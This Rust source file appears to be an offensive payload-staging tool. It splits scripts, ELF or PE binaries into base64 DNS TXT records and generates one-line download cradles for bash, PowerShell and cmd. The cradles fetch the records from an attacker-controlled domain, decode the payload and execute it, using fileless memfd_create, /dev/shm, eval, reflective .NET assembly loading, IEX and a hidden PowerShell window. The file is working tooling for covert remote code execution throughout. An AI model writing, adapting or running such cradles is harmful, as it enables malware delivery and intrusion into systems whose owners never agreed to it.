use crate::dns::{DnsBackend, DnsError};
use base64::Engine;
use serde::{Deserialize, Serialize};
use thiserror::Error;

/// Maximum base64-encoded bytes per TXT record.
/// Cloudflare allows 2048; we stay under to avoid edge cases.
const MAX_CHUNK_B64: usize = 1800;

/// Raw bytes that fit in one base64 chunk (3/4 of encoded size).
const MAX_CHUNK_RAW: usize = MAX_CHUNK_B64 * 3 / 4;

const RECORD_TTL: u32 = 60;

#[derive(Error, Debug)]
pub enum CradleError {
    #[error("DNS error: {0}")]
    Dns(#[from] DnsError),
    #[error("payload too small ({0} bytes)")]
    EmptyPayload(usize),
    #[error("metadata not found for label '{0}'")]
    MetaNotFound(String),
    #[error("metadata parse error: {0}")]
    MetaParse(String),
    #[error("{0}")]
    Other(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PayloadType {
    Script,
    Elf,
    Pe,
}

impl PayloadType {
    /// Detect payload type from magic bytes.
    pub fn detect(data: &[u8]) -> Self {
        if data.len() >= 4 && &data[..4] == b"\x7fELF" {
            PayloadType::Elf
        } else if data.len() >= 2 && &data[..2] == b"MZ" {
            PayloadType::Pe
        } else {
            PayloadType::Script
        }
    }
}

impl std::fmt::Display for PayloadType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PayloadType::Script => write!(f, "script"),
            PayloadType::Elf => write!(f, "elf"),
            PayloadType::Pe => write!(f, "pe"),
        }
    }
}

impl std::str::FromStr for PayloadType {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "script" => Ok(PayloadType::Script),
            "elf" => Ok(PayloadType::Elf),
            "pe" => Ok(PayloadType::Pe),
            _ => Err(format!("unknown payload type: {s}")),
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct StageMeta {
    pub chunks: usize,
    pub size: usize,
    #[serde(rename = "type")]
    pub payload_type: PayloadType,
    pub hash: String,
}

/// Shell type for cradle generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Shell {
    Bash,
    Pwsh,
    Cmd,
}

impl std::fmt::Display for Shell {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Shell::Bash => write!(f, "bash"),
            Shell::Pwsh => write!(f, "pwsh"),
            Shell::Cmd => write!(f, "cmd"),
        }
    }
}

impl std::str::FromStr for Shell {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "bash" | "sh" => Ok(Shell::Bash),
            "pwsh" | "powershell" | "ps" | "ps1" => Ok(Shell::Pwsh),
            "cmd" => Ok(Shell::Cmd),
            _ => Err(format!("unknown shell: {s} (try: bash, pwsh, cmd)")),
        }
    }
}

fn record_prefix(label: &str, domain: &str) -> String {
    format!("_s.{label}.{domain}")
}

fn meta_record_name(label: &str, domain: &str) -> String {
    format!("_s.meta.{label}.{domain}")
}

fn chunk_record_name(index: usize, label: &str, domain: &str) -> String {
    format!("_s.{index}.{label}.{domain}")
}

/// Stage a payload into DNS TXT records in a cradle-compatible format.
///
/// Records are plain base64 — NOT encrypted. This is intentional: cradles
/// must decode with native OS tools (dig + base64, Resolve-DnsName + [Convert]).
///
/// Returns the stage metadata.
pub async fn stage_payload(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
    data: &[u8],
    payload_type: Option<PayloadType>,
) -> Result<StageMeta, CradleError> {
    if data.is_empty() {
        return Err(CradleError::EmptyPayload(0));
    }

    let ptype = payload_type.unwrap_or_else(|| PayloadType::detect(data));
    let hash = blake3::hash(data).to_hex()[..32].to_string();

    // Split into raw chunks and base64 encode each
    let chunks: Vec<String> = data
        .chunks(MAX_CHUNK_RAW)
        .map(|chunk| base64::engine::general_purpose::STANDARD.encode(chunk))
        .collect();

    let meta = StageMeta {
        chunks: chunks.len(),
        size: data.len(),
        payload_type: ptype,
        hash,
    };

    // Upload metadata record
    let meta_name = meta_record_name(label, domain);
    let meta_json = serde_json::to_string(&meta)
        .map_err(|e| CradleError::Other(e.to_string()))?;
    backend.create_record(&meta_name, &meta_json, RECORD_TTL).await?;

    // Upload chunk records
    let mut batch: Vec<(String, String)> = Vec::with_capacity(chunks.len());
    for (i, encoded) in chunks.iter().enumerate() {
        batch.push((chunk_record_name(i, label, domain), encoded.clone()));
    }

    // Use batch_create for efficiency
    let batch_refs: Vec<(&str, &str, u32)> = batch
        .iter()
        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL))
        .collect();
    backend.batch_create(batch_refs).await?;

    Ok(meta)
}

/// Read staging metadata from DNS.
pub async fn read_stage_meta(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
) -> Result<StageMeta, CradleError> {
    let name = meta_record_name(label, domain);
    let records = backend.get_records(&name).await?;
    let record = records
        .first()
        .ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
    let meta: StageMeta = serde_json::from_str(&record.content)
        .map_err(|e| CradleError::MetaParse(e.to_string()))?;
    Ok(meta)
}

/// Remove all staged records for a label.
pub async fn unstage_payload(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
) -> Result<usize, CradleError> {
    let prefix = record_prefix(label, domain);
    let meta_name = meta_record_name(label, domain);

    let mut deleted = 0;

    // Delete metadata record
    let meta_records = backend.get_records(&meta_name).await?;
    for r in &meta_records {
        if let Some(id) = &r.id {
            backend.delete_record(id).await?;
            deleted += 1;
        }
    }

    // Delete chunk records by listing with prefix
    let all_records = backend.list_records(&prefix).await?;
    for r in &all_records {
        if let Some(id) = &r.id {
            backend.delete_record(id).await?;
            deleted += 1;
        }
    }

    Ok(deleted)
}

/// Generate a cradle one-liner for the given shell and payload.
pub fn generate_cradle(
    shell: Shell,
    domain: &str,
    label: &str,
    meta: &StageMeta,
    ns_server: Option<&str>,
) -> String {
    let n = meta.chunks - 1; // 0-indexed max
    let is_binary = matches!(meta.payload_type, PayloadType::Elf | PayloadType::Pe);

    match shell {
        Shell::Bash => generate_bash_cradle(domain, label, n, is_binary, ns_server),
        Shell::Pwsh => generate_pwsh_cradle(domain, label, n, is_binary, meta.payload_type, ns_server),
        Shell::Cmd => generate_cmd_cradle(domain, label, n, is_binary, meta.payload_type, ns_server),
    }
}

fn generate_bash_cradle(
    domain: &str,
    label: &str,
    max_idx: usize,
    is_binary: bool,
    ns_server: Option<&str>,
) -> String {
    let ns = ns_server
        .map(|s| format!(" @{s}"))
        .unwrap_or_default();

    let dns_fetch = format!(
        "for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done"
    );

    if is_binary {
        // Primary: python3 memfd_create (fully fileless)
        let memfd_cradle = format!(
            "python3 -c \"import ctypes,base64,os;b=base64.b64decode('$({})');\
             fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
             os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
            dns_fetch
        );

        // Fallback: /dev/shm (tmpfs, memory-backed, no python3 needed)
        let shm_cradle = format!(
            "{dns_fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x"
        );

        format!(
            "# Fileless (requires python3):\n{memfd_cradle}\n\n\
             # Fallback via /dev/shm (tmpfs, no python3):\n{shm_cradle}"
        )
    } else {
        format!("eval \"$({dns_fetch}|base64 -d)\"")
    }
}

fn generate_pwsh_cradle(
    domain: &str,
    label: &str,
    max_idx: usize,
    is_binary: bool,
    payload_type: PayloadType,
    ns_server: Option<&str>,
) -> String {
    let ns_param = ns_server
        .map(|s| format!(" -Se {s}"))
        .unwrap_or_default();

    let dns_fetch = format!(
        "-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_param}).Strings}})"
    );

    if is_binary {
        match payload_type {
            PayloadType::Pe => {
                // .NET assembly loading
                format!(
                    "$b=[Convert]::FromBase64String({dns_fetch});\
                     [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
                )
            }
            _ => {
                // ELF on PowerShell (Linux pwsh) — write to temp and exec
                format!(
                    "$b=[Convert]::FromBase64String({dns_fetch});\
                     $f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);\
                     chmod +x $f;Start-Process $f -Wait;rm $f"
                )
            }
        }
    } else {
        format!(
            "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({dns_fetch})))"
        )
    }
}

fn generate_cmd_cradle(
    domain: &str,
    label: &str,
    max_idx: usize,
    is_binary: bool,
    payload_type: PayloadType,
    ns_server: Option<&str>,
) -> String {
    // cmd wraps a PowerShell cradle
    let inner = generate_pwsh_cradle(domain, label, max_idx, is_binary, payload_type, ns_server);
    // Escape for cmd embedding
    let escaped = inner.replace('"', "\\\"");
    format!("powershell -nop -w hidden -c \"{escaped}\"")
}
